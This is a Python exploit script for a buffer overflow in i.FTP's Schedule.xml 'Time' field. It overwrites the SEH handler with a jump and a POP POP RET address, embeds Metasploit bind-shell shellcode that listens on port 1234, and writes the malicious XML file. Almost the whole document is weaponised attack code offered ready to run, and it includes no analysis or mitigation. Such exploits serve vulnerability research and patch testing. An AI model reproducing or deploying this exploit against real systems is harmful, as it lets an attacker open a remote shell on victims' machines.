# the field "Time" in Schedule.xml may cause a buffer overflow to i.FTP

url = "http://example.org"
folder = "somefolder"

# offset of nSEH is 600

time = "A" * 600  # offset of the nSEH
time += "\xEB\x06xx"  # xEB = JMP (near) rel8off. JMP +6. (jumps to shellcode)
time += "\x4A\xA2\x01\x10"  # address with POP POP RET sequence

# shellcode
# ruby msfpayload windows/shell_bind_tcp EXITFUNC=seh LPORT=1234 R | ruby msfencode -a x86 -b "\x00\x0a\x0d\x26" -t c
time += ("\xd9\xe1\xb8\xeb\xd0\xa5\xb3\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x56\x31\x43\x18\x03\x43\x18\x83\xc3\xef\x32\x50\x4f\x07\x3b"
"\x9b\xb0\xd7\x5c\x15\x55\xe6\x4e\x41\x1d\x5a\x5f\x01\x73\x56"
"\x14\x47\x60\xed\x58\x40\x87\x46\xd6\xb6\xa6\x57\xd6\x76\x64"
"\x9b\x78\x0b\x77\xcf\x5a\x32\xb8\x02\x9a\x73\xa5\xec\xce\x2c"
"\xa1\x5e\xff\x59\xf7\x62\xfe\x8d\x73\xda\x78\xab\x44\xae\x32"
"\xb2\x94\x1e\x48\xfc\x0c\x15\x16\xdd\x2d\xfa\x44\x21\x67\x77"
"\xbe\xd1\x76\x51\x8e\x1a\x49\x9d\x5d\x25\x65\x10\x9f\x61\x42"
"\xca\xea\x99\xb0\x77\xed\x59\xca\xa3\x78\x7c\x6c\x20\xda\xa4"
"\x8c\xe5\xbd\x2f\x82\x42\xc9\x68\x87\x55\x1e\x03\xb3\xde\xa1"
"\xc4\x35\xa4\x85\xc0\x1e\x7f\xa7\x51\xfb\x2e\xd8\x82\xa3\x8f"
"\x7c\xc8\x46\xc4\x07\x93\x0e\x29\x3a\x2c\xcf\x25\x4d\x5f\xfd"
"\xea\xe5\xf7\x4d\x63\x20\x0f\xb1\x5e\x94\x9f\x4c\x60\xe5\xb6"
"\x8a\x34\xb5\xa0\x3b\x34\x5e\x31\xc3\xe1\xf1\x61\x6b\x59\xb2"
"\xd1\xcb\x09\x5a\x38\xc4\x76\x7a\x43\x0e\x01\xbc\x8d\x6a\x42"
"\x2b\xec\x8c\x60\x79\x79\x6a\x02\x6d\x2c\x24\xba\x4f\x0b\xfd"
"\x5d\xaf\x79\x51\xf6\x27\x35\xbf\xc0\x48\xc6\x95\x63\xe4\x6e"
"\x7e\xf7\xe6\xaa\x9f\x08\x23\x9b\xd6\x31\xa4\x51\x87\xf0\x54"
"\x65\x82\x62\xf4\xf4\x49\x72\x73\xe5\xc5\x25\xd4\xdb\x1f\xa3"
"\xc8\x42\xb6\xd1\x10\x12\xf1\x51\xcf\xe7\xfc\x58\x82\x5c\xdb"
"\x4a\x5a\x5c\x67\x3e\x32\x0b\x31\xe8\xf4\xe5\xf3\x42\xaf\x5a"
"\x5a\x02\x36\x91\x5d\x54\x37\xfc\x2b\xb8\x86\xa9\x6d\xc7\x27"
"\x3e\x7a\xb0\x55\xde\x85\x6b\xde\xe0\x74\xa1\xcb\x75\x2f\x50"
"\xb6\x1b\xd0\x8f\xf5\x25\x53\x25\x86\xd1\x4b\x4c\x83\x9e\xcb"
"\xbd\xf9\x8f\xb9\xc1\xae\xb0\xeb")

# make program execute nops forever
time += "\x90" * 32  # add some nops
time += "\xEB\xFC"  # jump -4

time += "\x90" * (1500 - len(time))  # add more nops (this is needed for padding)

exploit = '<?xml version="1.0" encoding="UTF-8" ?>' + \
'<Schedule>' + \
	'<Event Url="{url}" Time="{time}" Folder="{folder}" />' + \
'</Schedule>'

exploit = exploit.format(**locals())


filename = "Schedule.xml"
file = open(filename , "w")
file.write(exploit)
print "\n[*]Created Schedule.xml"

file.close()